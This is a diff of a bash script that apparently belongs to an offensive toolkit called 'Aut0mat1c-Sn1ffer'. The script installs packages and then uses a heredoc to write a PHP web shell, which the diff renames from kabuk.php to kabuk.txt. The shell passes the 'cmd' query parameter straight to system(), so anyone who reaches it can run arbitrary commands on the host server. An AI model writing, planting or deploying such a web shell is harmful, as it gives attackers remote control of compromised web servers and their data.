@@ -1,5 +1,8 @@
 #!/bin/bash
-
+sudo apt update
+sudo apt install xterm
+sudo apt install python3
+clear
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 BLUE='\033[0;34m'
@@ -20,14 +23,14 @@ TARGET_DIR="$HOME/Desktop/X"
 mkdir -p "$TARGET_DIR"
 cd "$TARGET_DIR" || exit
 
-cat <<EOF > kabuk.php
+cat <<EOF > kabuk.txt
 <?php
 if(isset(\$_GET['cmd'])) {
     echo "<pre>";
     system(\$_GET['cmd']);
     echo "</pre>";
 } else {
-    echo "Aut0mat1c-Sn1ffer is active. Usage: ?cmd=[command]";
+    echo "Aut0mat1c-Sn1ffer is active. (Usage: ?cmd=[command])";
 }
 ?>
 EOF
